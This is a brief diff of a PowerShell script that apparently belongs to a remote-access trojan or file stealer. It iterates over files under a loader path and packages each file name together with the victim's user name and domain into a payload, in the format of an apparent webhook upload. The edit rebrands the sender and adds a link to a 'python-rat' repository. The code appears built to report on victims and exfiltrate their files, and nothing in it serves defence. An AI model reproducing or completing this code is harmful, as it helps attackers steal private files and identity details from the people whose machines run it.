@@ -41,8 +41,8 @@ Get-ChildItem -Path $loaderPath | ForEach-Object {
     $fileName = $_.Name
 
     $payload = @{
-        "username" = "hai1723 - $userName - $userDomain"
-        "content"  = "File: $fileName"
+        "username" = "Free - $userName - $userDomain"
+        "content"  = "https://github.com/s1uiasdad/python-rat`nFile: $fileName"
     }
 
     $form = @{
